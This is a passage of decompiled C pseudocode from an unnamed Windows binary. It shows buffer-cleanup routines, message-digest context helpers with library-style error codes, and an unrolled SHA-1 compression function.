                    goto LABEL_54;
                  v8 = sub_4090D0((int)a2, (int)a2, a1, v46, (int)&v38);
                  if ( v8 )
                    break;
                  v16 = v44;
                  v17 = (int)v45;
                }
              }
            }
          }
        }
      }
    }
  }
LABEL_70:
  v22 = 1 << (v48 - 1);
  if ( v22 < 1 << v48 )
  {
    v23 = &v27[3 * v22 + 2];
    v45 = (_DWORD *)((1 << v48) - v22);
    do
    {
      if ( v23 != (int *)8 )
      {
        v24 = *v23;
        if ( *v23 )
        {
          if ( 4 * *(v23 - 1) )
            sub_413EB0(v24, 0, 4 * *(v23 - 1));
          off_423FA4(v24);
        }
        *(v23 - 2) = 1;
        *(v23 - 1) = 0;
        *v23 = 0;
      }
      v23 += 3;
      v45 = (_DWORD *)((char *)v45 - 1);
    }
    while ( v45 );
  }
  v25 = lpMem;
  if ( lpMem )
  {
    if ( 4 * v29 )
    {
      sub_413EB0((int)lpMem, 0, 4 * v29);
      v25 = lpMem;
    }
    off_423FA4(v25);
  }
  if ( v40 )
  {
    if ( 4 * v39 )
      sub_413EB0((int)v40, 0, 4 * v39);
    off_423FA4(v40);
  }
  if ( v37 )
  {
    if ( 4 * v36 )
      sub_413EB0((int)v37, 0, 4 * v36);
    off_423FA4(v37);
  }
  if ( (!a5 || !a5[2]) && v43 )
  {
    if ( 4 * v42 )
      sub_413EB0((int)v43, 0, 4 * v42);
    off_423FA4(v43);
  }
  return v8;
}
// 423FA4: using guessed type int (__cdecl *off_423FA4)(_DWORD);

//----- (004098E0) --------------------------------------------------------
void __usercall sub_4098E0(_DWORD *a1@<esi>)
{
  int v1; // ecx
  unsigned int v2; // eax

  if ( a1 && *a1 )
  {
    if ( a1[1] )
      (*(void (__cdecl **)(_DWORD))(*a1 + 36))(a1[1]);
    v1 = a1[2];
    if ( v1 )
    {
      v2 = 2 * *(_DWORD *)(*a1 + 12);
      if ( v2 )
        sub_413EB0(v1, 0, v2);
      off_423FA4(a1[2]);
    }
    sub_413EB0((int)a1, 0, 0xCu);
  }
}
// 423FA4: using guessed type int (__cdecl *off_423FA4)(_DWORD);

//----- (00409940) --------------------------------------------------------
int __usercall sub_409940@<eax>(_DWORD *a1@<edi>, int a2@<esi>)
{
  int v2; // eax

  if ( !a2 || !a1 )
    return -20736;
  v2 = (*(int (**)(void))(a2 + 32))();
  a1[1] = v2;
  if ( !v2 )
    return -20864;
  *a1 = a2;
  return 0;
}

//----- (00409970) --------------------------------------------------------
int __usercall sub_409970@<eax>(int a1@<eax>, int a2@<ecx>)
{
  if ( a1 )
    return (*(int (__cdecl **)(_DWORD, _DWORD, int))(a1 + 28))(0, 0, a2);
  else
    return -20736;
}

//----- (00409990) --------------------------------------------------------
int __usercall sub_409990@<eax>(unsigned __int8 *a1@<eax>, _DWORD *a2)
{
  int v2; // esi
  int v3; // ecx
  int v4; // edx
  int v5; // edi
  int v6; // edi
  int v7; // edi
  int v8; // eax
  int v9; // edi
  int v10; // edi
  int v11; // edi
  int v12; // ebx
  int v13; // eax
  int v14; // ecx
  int v15; // edi
  int v16; // esi
  int v17; // edi
  int v18; // edi
  int v19; // edi
  int v20; // ebx
  int v21; // edi
  int v22; // esi
  int v23; // edx
  int v24; // edi
  int v25; // ecx
  int v26; // esi
  int v27; // ebx
  int v28; // ebx
  int v29; // ebx
  int v30; // esi
  int v31; // ebx
  int v32; // ebx
  int v33; // ebx
  int v34; // edi
  int v35; // ebx
  int v36; // esi
  int v37; // ebx
  int v38; // edi
  int v39; // edx
  int v40; // eax
  int v41; // edx
  int v42; // ecx
  int v43; // edx
  int v44; // edx
  int v45; // ebx
  int v46; // esi
  int v47; // edx
  int v48; // ebx
  int v49; // esi
  int v50; // ecx
  int v51; // edi
  int v52; // ecx
  int v53; // edx
  int v55; // [esp+Ch] [ebp-58h]
  int v56; // [esp+Ch] [ebp-58h]
  int v57; // [esp+Ch] [ebp-58h]
  int v58; // [esp+Ch] [ebp-58h]
  int v59; // [esp+Ch] [ebp-58h]
  int v60; // [esp+10h] [ebp-54h]
  int v61; // [esp+10h] [ebp-54h]
  int v62; // [esp+10h] [ebp-54h]
  int v63; // [esp+10h] [ebp-54h]
  int v64; // [esp+10h] [ebp-54h]
  int v65; // [esp+14h] [ebp-50h]
  int v66; // [esp+14h] [ebp-50h]
  int v67; // [esp+14h] [ebp-50h]
  int v68; // [esp+14h] [ebp-50h]
  int v69; // [esp+14h] [ebp-50h]
  int v70; // [esp+18h] [ebp-4Ch]
  int v71; // [esp+18h] [ebp-4Ch]
  int v72; // [esp+18h] [ebp-4Ch]
  int v73; // [esp+18h] [ebp-4Ch]
  int v74; // [esp+18h] [ebp-4Ch]
  int v75; // [esp+1Ch] [ebp-48h]
  int v76; // [esp+1Ch] [ebp-48h]
  int v77; // [esp+1Ch] [ebp-48h]
  int v78; // [esp+1Ch] [ebp-48h]
  int v79; // [esp+1Ch] [ebp-48h]
  int v80; // [esp+20h] [ebp-44h]
  int v81; // [esp+20h] [ebp-44h]
  int v82; // [esp+20h] [ebp-44h]
  int v83; // [esp+20h] [ebp-44h]
  int v84; // [esp+20h] [ebp-44h]
  int v85; // [esp+24h] [ebp-40h]
  int v86; // [esp+24h] [ebp-40h]
  int v87; // [esp+24h] [ebp-40h]
  int v88; // [esp+24h] [ebp-40h]
  int v89; // [esp+24h] [ebp-40h]
  int v90; // [esp+28h] [ebp-3Ch]
  int v91; // [esp+28h] [ebp-3Ch]
  int v92; // [esp+28h] [ebp-3Ch]
  int v93; // [esp+28h] [ebp-3Ch]
  int v94; // [esp+28h] [ebp-3Ch]
  int v95; // [esp+2Ch] [ebp-38h]
  int v96; // [esp+2Ch] [ebp-38h]
  int v97; // [esp+2Ch] [ebp-38h]
  int v98; // [esp+2Ch] [ebp-38h]
  int v99; // [esp+2Ch] [ebp-38h]
  int v100; // [esp+30h] [ebp-34h]
  int v101; // [esp+30h] [ebp-34h]
  int v102; // [esp+30h] [ebp-34h]
  int v103; // [esp+30h] [ebp-34h]
  int v104; // [esp+30h] [ebp-34h]
  int v105; // [esp+34h] [ebp-30h]
  int v106; // [esp+34h] [ebp-30h]
  int v107; // [esp+34h] [ebp-30h]
  int v108; // [esp+34h] [ebp-30h]
  int v109; // [esp+34h] [ebp-30h]
  int v110; // [esp+38h] [ebp-2Ch]
  int v111; // [esp+38h] [ebp-2Ch]
  int v112; // [esp+38h] [ebp-2Ch]
  int v113; // [esp+38h] [ebp-2Ch]
  int v114; // [esp+38h] [ebp-2Ch]
  int v115; // [esp+3Ch] [ebp-28h]
  int v116; // [esp+3Ch] [ebp-28h]
  int v117; // [esp+3Ch] [ebp-28h]
  int v118; // [esp+3Ch] [ebp-28h]
  int v119; // [esp+44h] [ebp-20h]
  int v120; // [esp+48h] [ebp-1Ch]
  int v121; // [esp+48h] [ebp-1Ch]
  int v122; // [esp+50h] [ebp-14h]
  int v123; // [esp+50h] [ebp-14h]
  int v124; // [esp+50h] [ebp-14h]
  int v125; // [esp+50h] [ebp-14h]
  int v126; // [esp+50h] [ebp-14h]
  int v127; // [esp+50h] [ebp-14h]
  int v128; // [esp+50h] [ebp-14h]
  int v129; // [esp+50h] [ebp-14h]
  int v130; // [esp+50h] [ebp-14h]
  int v131; // [esp+50h] [ebp-14h]
  int v132; // [esp+50h] [ebp-14h]
  int v133; // [esp+50h] [ebp-14h]
  int v134; // [esp+50h] [ebp-14h]
  int v135; // [esp+50h] [ebp-14h]
  int v136; // [esp+50h] [ebp-14h]
  int v137; // [esp+50h] [ebp-14h]
  int v138; // [esp+50h] [ebp-14h]
  int v139; // [esp+50h] [ebp-14h]
  int v140; // [esp+50h] [ebp-14h]
  int v141; // [esp+50h] [ebp-14h]
  int v142; // [esp+50h] [ebp-14h]
  int v143; // [esp+50h] [ebp-14h]
  int v144; // [esp+50h] [ebp-14h]
  int v145; // [esp+54h] [ebp-10h]
  int v146; // [esp+54h] [ebp-10h]
  int v147; // [esp+54h] [ebp-10h]
  int v148; // [esp+54h] [ebp-10h]
  int v149; // [esp+54h] [ebp-10h]
  int v150; // [esp+54h] [ebp-10h]
  int v151; // [esp+54h] [ebp-10h]
  int v152; // [esp+54h] [ebp-10h]
  int v153; // [esp+54h] [ebp-10h]
  int v154; // [esp+54h] [ebp-10h]
  int v155; // [esp+54h] [ebp-10h]
  int v156; // [esp+54h] [ebp-10h]
  int v157; // [esp+54h] [ebp-10h]
  int v158; // [esp+54h] [ebp-10h]
  int v159; // [esp+54h] [ebp-10h]
  int v160; // [esp+54h] [ebp-10h]
  int v161; // [esp+54h] [ebp-10h]
  int v162; // [esp+54h] [ebp-10h]
  int v163; // [esp+54h] [ebp-10h]
  int v164; // [esp+54h] [ebp-10h]
  int v165; // [esp+54h] [ebp-10h]
  int v166; // [esp+54h] [ebp-10h]
  int v167; // [esp+54h] [ebp-10h]
  int v168; // [esp+54h] [ebp-10h]
  int v169; // [esp+54h] [ebp-10h]
  int v170; // [esp+54h] [ebp-10h]
  int v171; // [esp+54h] [ebp-10h]
  int v172; // [esp+58h] [ebp-Ch]
  int v173; // [esp+58h] [ebp-Ch]
  int v174; // [esp+58h] [ebp-Ch]
  int v175; // [esp+58h] [ebp-Ch]
  int v176; // [esp+58h] [ebp-Ch]
  int v177; // [esp+58h] [ebp-Ch]
  int v178; // [esp+58h] [ebp-Ch]
  int v179; // [esp+58h] [ebp-Ch]
  int v180; // [esp+58h] [ebp-Ch]
  int v181; // [esp+58h] [ebp-Ch]
  int v182; // [esp+58h] [ebp-Ch]
  int v183; // [esp+58h] [ebp-Ch]
  int v184; // [esp+58h] [ebp-Ch]
  int v185; // [esp+58h] [ebp-Ch]
  int v186; // [esp+58h] [ebp-Ch]
  int v187; // [esp+58h] [ebp-Ch]
  int v188; // [esp+58h] [ebp-Ch]
  int v189; // [esp+58h] [ebp-Ch]
  int v190; // [esp+58h] [ebp-Ch]
  int v191; // [esp+58h] [ebp-Ch]
  int v192; // [esp+58h] [ebp-Ch]
  int v193; // [esp+58h] [ebp-Ch]
  int v194; // [esp+58h] [ebp-Ch]
  int v195; // [esp+58h] [ebp-Ch]
  int v196; // [esp+58h] [ebp-Ch]
  int v197; // [esp+58h] [ebp-Ch]
  int v198; // [esp+58h] [ebp-Ch]
  int v199; // [esp+58h] [ebp-Ch]
  int v200; // [esp+58h] [ebp-Ch]
  int v201; // [esp+5Ch] [ebp-8h]
  int v202; // [esp+5Ch] [ebp-8h]
  int v203; // [esp+5Ch] [ebp-8h]
  int v204; // [esp+5Ch] [ebp-8h]
  int v205; // [esp+5Ch] [ebp-8h]
  int v206; // [esp+5Ch] [ebp-8h]
  int v207; // [esp+5Ch] [ebp-8h]
  int v208; // [esp+5Ch] [ebp-8h]
  int v209; // [esp+5Ch] [ebp-8h]
  int v210; // [esp+5Ch] [ebp-8h]
  int v211; // [esp+5Ch] [ebp-8h]
  int v212; // [esp+5Ch] [ebp-8h]
  int v213; // [esp+5Ch] [ebp-8h]
  int v214; // [esp+5Ch] [ebp-8h]
  int v215; // [esp+5Ch] [ebp-8h]
  int v216; // [esp+5Ch] [ebp-8h]
  int v217; // [esp+5Ch] [ebp-8h]
  int v218; // [esp+5Ch] [ebp-8h]
  int v219; // [esp+5Ch] [ebp-8h]
  int v220; // [esp+5Ch] [ebp-8h]
  int v221; // [esp+5Ch] [ebp-8h]
  int v222; // [esp+5Ch] [ebp-8h]
  int v223; // [esp+5Ch] [ebp-8h]
  int v224; // [esp+5Ch] [ebp-8h]
  int v225; // [esp+5Ch] [ebp-8h]
  int v226; // [esp+5Ch] [ebp-8h]
  int v227; // [esp+5Ch] [ebp-8h]
  int v228; // [esp+5Ch] [ebp-8h]
  int v229; // [esp+5Ch] [ebp-8h]
  int v230; // [esp+5Ch] [ebp-8h]
  int v231; // [esp+5Ch] [ebp-8h]
  int v232; // [esp+60h] [ebp-4h]
  int v233; // [esp+60h] [ebp-4h]
  int v234; // [esp+60h] [ebp-4h]
  int v235; // [esp+60h] [ebp-4h]
  int v236; // [esp+60h] [ebp-4h]
  int v237; // [esp+60h] [ebp-4h]
  int v238; // [esp+60h] [ebp-4h]
  int v239; // [esp+60h] [ebp-4h]
  int v240; // [esp+60h] [ebp-4h]
  int v241; // [esp+60h] [ebp-4h]
  int v242; // [esp+60h] [ebp-4h]
  int v243; // [esp+60h] [ebp-4h]
  int v244; // [esp+60h] [ebp-4h]
  int v245; // [esp+60h] [ebp-4h]
  int v246; // [esp+60h] [ebp-4h]
  int v247; // [esp+60h] [ebp-4h]
  int v248; // [esp+60h] [ebp-4h]
  int v249; // [esp+60h] [ebp-4h]
  int v250; // [esp+60h] [ebp-4h]
  int v251; // [esp+60h] [ebp-4h]
  int v252; // [esp+60h] [ebp-4h]
  int v253; // [esp+60h] [ebp-4h]
  int v254; // [esp+60h] [ebp-4h]
  int v255; // [esp+60h] [ebp-4h]
  int v256; // [esp+60h] [ebp-4h]

  v55 = a1[3] | ((a1[2] | ((a1[1] | (*a1 << 8)) << 8)) << 8);
  v60 = a1[7] | ((a1[6] | ((a1[5] | (a1[4] << 8)) << 8)) << 8);
  v65 = a1[11] | ((a1[10] | ((a1[9] | (a1[8] << 8)) << 8)) << 8);
  v70 = a1[15] | ((a1[14] | ((a1[13] | (a1[12] << 8)) << 8)) << 8);
  v75 = a1[19] | ((a1[18] | ((a1[17] | (a1[16] << 8)) << 8)) << 8);
  v80 = a1[23] | ((a1[22] | ((a1[21] | (a1[20] << 8)) << 8)) << 8);
  v85 = a1[27] | ((a1[26] | ((a1[25] | (a1[24] << 8)) << 8)) << 8);
  v90 = a1[31] | ((a1[30] | ((a1[29] | (a1[28] << 8)) << 8)) << 8);
  v95 = a1[35] | ((a1[34] | ((a1[33] | (a1[32] << 8)) << 8)) << 8);
  v100 = a1[39] | ((a1[38] | ((a1[37] | (a1[36] << 8)) << 8)) << 8);
  v105 = a1[43] | ((a1[42] | ((a1[41] | (a1[40] << 8)) << 8)) << 8);
  v110 = a1[47] | ((a1[46] | ((a1[45] | (a1[44] << 8)) << 8)) << 8);
  v115 = a1[51] | ((a1[50] | ((a1[49] | (a1[48] << 8)) << 8)) << 8);
  v2 = a1[55] | ((a1[54] | ((a1[53] | (a1[52] << 8)) << 8)) << 8);
  v3 = a1[59] | ((a1[58] | ((a1[57] | (a1[56] << 8)) << 8)) << 8);
  v4 = a1[63] | ((a1[62] | ((a1[61] | (a1[60] << 8)) << 8)) << 8);
  v201 = __ROR4__(a2[3], 2);
  v232 = a2[6] + __ROL4__(a2[2], 5) + (a2[5] ^ a2[3] & (a2[4] ^ a2[5])) + v55 + 1518500249;
  v145 = a2[5] + v60 + __ROL4__(v232, 5) + (a2[4] ^ a2[2] & (v201 ^ a2[4])) + 1518500249;
  v172 = __ROR4__(a2[2], 2);
  v5 = a2[4] + v65 + __ROL4__(v145, 5) + (v201 ^ v232 & (v172 ^ v201)) + 1518500249;
  v233 = __ROR4__(v232, 2);
  v202 = v201 + v70 + __ROL4__(v5, 5) + (v172 ^ v145 & (v172 ^ v233)) + 1518500249;
  v146 = __ROR4__(v145, 2);
  v173 = v172 + v75 + __ROL4__(v202, 5) + (v233 ^ v5 & (v146 ^ v233)) + 1518500249;
  v122 = __ROR4__(v5, 2);
  v234 = v233 + v80 + __ROL4__(v173, 5) + (v146 ^ v202 & (v122 ^ v146)) + 1518500249;
  v203 = __ROR4__(v202, 2);
  v147 = v146 + v85 + __ROL4__(v234, 5) + (v122 ^ v173 & (v203 ^ v122)) + 1518500249;
  v174 = __ROR4__(v173, 2);
  v6 = v122 + v90 + __ROL4__(v147, 5) + (v203 ^ v234 & (v174 ^ v203)) + 1518500249;
  v235 = __ROR4__(v234, 2);
  v204 = v203 + v95 + __ROL4__(v6, 5) + (v174 ^ v147 & (v174 ^ v235)) + 1518500249;
  v148 = __ROR4__(v147, 2);
  v175 = v174 + v100 + __ROL4__(v204, 5) + (v235 ^ v6 & (v148 ^ v235)) + 1518500249;
  v123 = __ROR4__(v6, 2);
  v236 = v235 + v105 + __ROL4__(v175, 5) + (v148 ^ v204 & (v123 ^ v148)) + 1518500249;
  v205 = __ROR4__(v204, 2);
  v149 = v148 + v110 + __ROL4__(v236, 5) + (v123 ^ v175 & (v205 ^ v123)) + 1518500249;
  v176 = __ROR4__(v175, 2);
  v7 = v123 + v115 + __ROL4__(v149, 5) + (v205 ^ v236 & (v176 ^ v205)) + 1518500249;
  v237 = __ROR4__(v236, 2);
  v206 = v205 + v2 + __ROL4__(v7, 5) + (v176 ^ v149 & (v176 ^ v237)) + 1518500249;
  v150 = __ROR4__(v149, 2);
  v177 = v176 + v3 + __ROL4__(v206, 5) + (v237 ^ v7 & (v150 ^ v237)) + 1518500249;
  v124 = __ROR4__(v7, 2);
  v238 = v237 + v4 + __ROL4__(v177, 5) + (v150 ^ v206 & (v124 ^ v150)) + 1518500249;
  v207 = __ROR4__(v206, 2);
  v56 = __ROL4__(v55 ^ v65 ^ v95 ^ v2, 1);
  v151 = v150 + v56 + __ROL4__(v238, 5) + (v124 ^ v177 & (v207 ^ v124)) + 1518500249;
  v178 = __ROR4__(v177, 2);
  v61 = __ROL4__(v60 ^ v70 ^ v100 ^ v3, 1);
  v8 = v238 & (v178 ^ v207);
  v239 = __ROR4__(v238, 2);
  v125 = v124 + v61 + __ROL4__(v151, 5) + (v207 ^ v8) + 1518500249;
  v66 = __ROL4__(v65 ^ v75 ^ v105 ^ v4, 1);
  v208 = v207 + v66 + __ROL4__(v125, 5) + (v178 ^ v151 & (v178 ^ v239)) + 1518500249;
  v71 = __ROL4__(v56 ^ v70 ^ v80 ^ v110, 1);
  v152 = __ROR4__(v151, 2);
  v179 = v178 + v71 + __ROL4__(v208, 5) + (v239 ^ v125 & (v152 ^ v239)) + 1518500249;
  v126 = __ROR4__(v125, 2);
  v76 = __ROL4__(v61 ^ v75 ^ v85 ^ v115, 1);
  v240 = v239 + v76 + __ROL4__(v179, 5) + (v208 ^ v126 ^ v152) + 1859775393;
  v209 = __ROR4__(v208, 2);
  v81 = __ROL4__(v66 ^ v80 ^ v90 ^ v2, 1);
  v9 = v152 + v81 + __ROL4__(v240, 5) + (v179 ^ v209 ^ v126) + 1859775393;
  v180 = __ROR4__(v179, 2);
  v86 = __ROL4__(v71 ^ v85 ^ v95 ^ v3, 1);
  v127 = v126 + v86 + __ROL4__(v9, 5) + (v180 ^ v209 ^ v240) + 1859775393;
  v241 = __ROR4__(v240, 2);
  v91 = __ROL4__(v76 ^ v90 ^ v100 ^ v4, 1);
  v210 = v209 + v91 + __ROL4__(v127, 5) + (v180 ^ v9 ^ v241) + 1859775393;
  v96 = __ROL4__(v56 ^ v81 ^ v95 ^ v105, 1);
  v153 = __ROR4__(v9, 2);
  v181 = v180 + v96 + __ROL4__(v210, 5) + (v127 ^ v153 ^ v241) + 1859775393;
  v128 = __ROR4__(v127, 2);
  v101 = __ROL4__(v61 ^ v86 ^ v100 ^ v110, 1);
  v242 = v241 + v101 + __ROL4__(v181, 5) + (v210 ^ v128 ^ v153) + 1859775393;
  v106 = __ROL4__(v66 ^ v91 ^ v105 ^ v115, 1);
  v211 = __ROR4__(v210, 2);
  v10 = v153 + v106 + __ROL4__(v242, 5) + (v181 ^ v211 ^ v128) + 1859775393;
  v182 = __ROR4__(v181, 2);
  v154 = v10;
  v111 = __ROL4__(v71 ^ v96 ^ v110 ^ v2, 1);
  v11 = v128 + v111 + __ROL4__(v10, 5) + (v182 ^ v211 ^ v242) + 1859775393;
  v243 = __ROR4__(v242, 2);
  v116 = __ROL4__(v76 ^ v101 ^ v115 ^ v3, 1);
  v12 = __ROR4__(v154, 2);
  v212 = v211 + v116 + __ROL4__(v11, 5) + (v182 ^ v154 ^ v243) + 1859775393;
  v13 = __ROL4__(v81 ^ v106 ^ v2 ^ v4, 1);
  v183 = v182 + v13 + __ROL4__(v212, 5) + (v11 ^ v12 ^ v243) + 1859775393;
  v129 = __ROR4__(v11, 2);
  v14 = __ROL4__(v56 ^ v86 ^ v111 ^ v3, 1);
  v15 = v243 + v14 + __ROL4__(v183, 5) + (v212 ^ v129 ^ v12) + 1859775393;
  v120 = __ROL4__(v61 ^ v91 ^ v116 ^ v4, 1);
  v213 = __ROR4__(v212, 2);
  v155 = v12 + v120 + __ROL4__(v15, 5) + (v183 ^ v213 ^ v129) + 1859775393;
  v184 = __ROR4__(v183, 2);
  v16 = __ROL4__(v56 ^ v66 ^ v96 ^ v13, 1);
  v244 = __ROR4__(v15, 2);
  v130 = v129 + v16 + __ROL4__(v155, 5) + (v184 ^ v213 ^ v15) + 1859775393;
  v62 = __ROL4__(v61 ^ v71 ^ v101 ^ v14, 1);
  v214 = v213 + v62 + __ROL4__(v130, 5) + (v184 ^ v155 ^ v244) + 1859775393;
  v67 = __ROL4__(v66 ^ v76 ^ v106 ^ v120, 1);
  v156 = __ROR4__(v155, 2);
  v57 = v16;
  v185 = v184 + v67 + __ROL4__(v214, 5) + (v130 ^ v156 ^ v244) + 1859775393;
  v131 = __ROR4__(v130, 2);
  v72 = __ROL4__(v16 ^ v71 ^ v81 ^ v111, 1);
  v245 = v244 + v72 + __ROL4__(v185, 5) + (v214 ^ v131 ^ v156) + 1859775393;
  v215 = __ROR4__(v214, 2);
  v77 = __ROL4__(v62 ^ v76 ^ v86 ^ v116, 1);
  v17 = v156 + v77 + __ROL4__(v245, 5) + (v185 ^ v215 ^ v131) + 1859775393;
  v186 = __ROR4__(v185, 2);
  v157 = v17;
  v82 = __ROL4__(v67 ^ v81 ^ v91 ^ v13, 1);
  v18 = v131 + v82 + __ROL4__(v17, 5) + (v186 ^ v215 ^ v245) + 1859775393;
  v246 = __ROR4__(v245, 2);
  v87 = __ROL4__(v72 ^ v86 ^ v96 ^ v14, 1);
  v216 = v215 + v87 + __ROL4__(v18, 5) + (v186 ^ v157 ^ v246) + 1859775393;
  v92 = __ROL4__(v77 ^ v91 ^ v101 ^ v120, 1);
  v158 = __ROR4__(v157, 2);
  v97 = __ROL4__(v16 ^ v82 ^ v96 ^ v106, 1);
  v187 = v186 + v92 + __ROL4__(v216, 5) + (v18 ^ v158 ^ v246) + 1859775393;
  v132 = __ROR4__(v18, 2);
  v19 = v246 + v97 + (v216 & v132 | v158 & (v216 | v132)) + __ROL4__(v187, 5) - 1894007588;
  v217 = __ROR4__(v216, 2);
  v102 = __ROL4__(v62 ^ v87 ^ v101 ^ v111, 1);
  v20 = v158 + v102 + (v187 & v217 | v132 & (v187 | v217));
  v188 = __ROR4__(v187, 2);
  v159 = v20 + __ROL4__(v19, 5) - 1894007588;
  v107 = __ROL4__(v67 ^ v92 ^ v106 ^ v116, 1);
  v112 = __ROL4__(v72 ^ v97 ^ v111 ^ v13, 1);
  v133 = v132 + v107 + (v188 & v19 | v217 & (v188 | v19)) + __ROL4__(v159, 5) - 1894007588;
  v247 = __ROR4__(v19, 2);
  v21 = v217 + v112 + (v159 & v247 | v188 & (v159 | v247)) + __ROL4__(v133, 5) - 1894007588;
  v160 = __ROR4__(v159, 2);
  v117 = __ROL4__(v77 ^ v102 ^ v116 ^ v14, 1);
  v218 = v21;
  v22 = v188 + v117 + (v133 & v160 | v247 & (v133 | v160)) + __ROL4__(v21, 5) - 1894007588;
  v134 = __ROR4__(v133, 2);
  v23 = __ROL4__(v82 ^ v107 ^ v13 ^ v120, 1);
  v24 = v247 + v23 + (v218 & v134 | v160 & (v218 | v134)) + __ROL4__(v22, 5) - 1894007588;
  v219 = __ROR4__(v218, 2);
  v25 = __ROL4__(v57 ^ v87 ^ v112 ^ v14, 1);
  v161 = v160 + v25 + (v22 & v219 | v134 & (v22 | v219)) + __ROL4__(v24, 5) - 1894007588;
  v189 = __ROR4__(v22, 2);
  v121 = __ROL4__(v62 ^ v92 ^ v117 ^ v120, 1);
  v26 = __ROR4__(v24, 2);
  v135 = v134 + v121 + (v189 & v24 | v219 & (v189 | v24)) + __ROL4__(v161, 5) - 1894007588;
  v58 = __ROL4__(v57 ^ v67 ^ v97 ^ v23, 1);
  v27 = v219 + v58 + (v161 & v26 | v189 & (v161 | v26));
  v162 = __ROR4__(v161, 2);
  v220 = v27 + __ROL4__(v135, 5) - 1894007588;
  v63 = __ROL4__(v62 ^ v72 ^ v102 ^ v25, 1);
  v28 = v189 + v63 + (v135 & v162 | v26 & (v135 | v162));
  v136 = __ROR4__(v135, 2);
  v68 = __ROL4__(v67 ^ v77 ^ v107 ^ v121, 1);
  v190 = v28 + __ROL4__(v220, 5) - 1894007588;
  v29 = v26 + v68 + (v220 & v136 | v162 & (v220 | v136));
  v221 = __ROR4__(v220, 2);
  v73 = __ROL4__(v58 ^ v72 ^ v82 ^ v112, 1);
  v248 = v29 + __ROL4__(v190, 5) - 1894007588;
  v163 = v162 + v73 + (v190 & v221 | v136 & (v190 | v221)) + __ROL4__(v248, 5) - 1894007588;
  v191 = __ROR4__(v190, 2);
  v78 = __ROL4__(v63 ^ v77 ^ v87 ^ v117, 1);
  v30 = __ROR4__(v248, 2);
  v137 = v136 + v78 + (v191 & v248 | v221 & (v191 | v248)) + __ROL4__(v163, 5) - 1894007588;
  v83 = __ROL4__(v68 ^ v82 ^ v92 ^ v23, 1);
  v31 = v221 + v83 + (v163 & v30 | v191 & (v163 | v30));
  v164 = __ROR4__(v163, 2);
  v222 = v31 + __ROL4__(v137, 5) - 1894007588;
  v88 = __ROL4__(v73 ^ v87 ^ v97 ^ v25, 1);
  v32 = v191 + v88 + (v137 & v164 | v30 & (v137 | v164));
  v138 = __ROR4__(v137, 2);
  v93 = __ROL4__(v78 ^ v92 ^ v102 ^ v121, 1);
  v192 = v32 + __ROL4__(v222, 5) - 1894007588;
  v249 = v30 + v93 + (v222 & v138 | v164 & (v222 | v138)) + __ROL4__(v192, 5) - 1894007588;
  v223 = __ROR4__(v222, 2);
  v98 = __ROL4__(v58 ^ v83 ^ v97 ^ v107, 1);
  v33 = v164 + v98 + (v192 & v223 | v138 & (v192 | v223));
  v193 = __ROR4__(v192, 2);
  v165 = v33 + __ROL4__(v249, 5) - 1894007588;
  v103 = __ROL4__(v63 ^ v88 ^ v102 ^ v112, 1);
  v34 = v138 + v103 + (v193 & v249 | v223 & (v193 | v249)) + __ROL4__(v165, 5) - 1894007588;
  v108 = __ROL4__(v68 ^ v93 ^ v107 ^ v117, 1);
  v250 = __ROR4__(v249, 2);
  v35 = v223 + v108 + (v165 & v250 | v193 & (v165 | v250));
  v166 = __ROR4__(v165, 2);
  v113 = __ROL4__(v73 ^ v98 ^ v112 ^ v23, 1);
  v224 = v35 + __ROL4__(v34, 5) - 1894007588;
  v194 = v193 + v113 + (v34 & v166 | v250 & (v34 | v166)) + __ROL4__(v224, 5) - 1894007588;
  v139 = __ROR4__(v34, 2);
  v36 = __ROL4__(v78 ^ v103 ^ v117 ^ v25, 1);
  v37 = v250 + v36 + (v224 ^ v139 ^ v166) + __ROL4__(v194, 5) - 899497514;
  v225 = __ROR4__(v224, 2);
  v38 = __ROL4__(v83 ^ v108 ^ v23 ^ v121, 1);
  v119 = __ROL4__(v58 ^ v88 ^ v113 ^ v25, 1);
  v39 = __ROR4__(v194, 2);
  v167 = v166 + v38 + (v194 ^ v225 ^ v139) + __ROL4__(v37, 5) - 899497514;
  v251 = __ROR4__(v37, 2);
  v140 = v139 + v119 + (v39 ^ v225 ^ v37) + __ROL4__(v167, 5) - 899497514;
  v40 = __ROL4__(v63 ^ v93 ^ v36 ^ v121, 1);
  v226 = v225 + v40 + (v39 ^ v167 ^ v251) + __ROL4__(v140, 5) - 899497514;
  v168 = __ROR4__(v167, 2);
  v59 = __ROL4__(v58 ^ v68 ^ v98 ^ v38, 1);
  v195 = v39 + v59 + (v140 ^ v168 ^ v251) + __ROL4__(v226, 5) - 899497514;
  v141 = __ROR4__(v140, 2);
  v64 = __ROL4__(v63 ^ v73 ^ v103 ^ v119, 1);
  v252 = v251 + v64 + (v226 ^ v141 ^ v168) + __ROL4__(v195, 5) - 899497514;
  v227 = __ROR4__(v226, 2);
  v69 = __ROL4__(v68 ^ v78 ^ v108 ^ v40, 1);
  v41 = v168 + v69 + (v195 ^ v227 ^ v141) + __ROL4__(v252, 5) - 899497514;
  v196 = __ROR4__(v195, 2);
  v74 = __ROL4__(v59 ^ v73 ^ v83 ^ v113, 1);
  v42 = v196 ^ v227 ^ v252;
  v253 = __ROR4__(v252, 2);
  v142 = v141 + v74 + v42 + __ROL4__(v41, 5) - 899497514;
  v79 = __ROL4__(v64 ^ v78 ^ v88 ^ v36, 1);
  v84 = __ROL4__(v69 ^ v83 ^ v93 ^ v38, 1);
  v228 = v227 + v79 + (v196 ^ v41 ^ v253) + __ROL4__(v142, 5) - 899497514;
  v169 = __ROR4__(v41, 2);
  v197 = v196 + v84 + (v142 ^ v169 ^ v253) + __ROL4__(v228, 5) - 899497514;
  v143 = __ROR4__(v142, 2);
  v89 = __ROL4__(v74 ^ v88 ^ v98 ^ v119, 1);
  v254 = v253 + v89 + (v228 ^ v143 ^ v169) + __ROL4__(v197, 5) - 899497514;
  v229 = __ROR4__(v228, 2);
  v94 = __ROL4__(v79 ^ v93 ^ v103 ^ v40, 1);
  v43 = v169 + v94 + (v197 ^ v229 ^ v143) + __ROL4__(v254, 5) - 899497514;
  v198 = __ROR4__(v197, 2);
  v170 = v43;
  v99 = __ROL4__(v59 ^ v84 ^ v98 ^ v108, 1);
  v44 = v143 + v99 + (v198 ^ v229 ^ v254) + __ROL4__(v43, 5) - 899497514;
  v255 = __ROR4__(v254, 2);
  v104 = __ROL4__(v64 ^ v89 ^ v103 ^ v113, 1);
  v109 = __ROL4__(v69 ^ v94 ^ v108 ^ v36, 1);
  v230 = v229 + v104 + (v198 ^ v170 ^ v255) + __ROL4__(v44, 5) - 899497514;
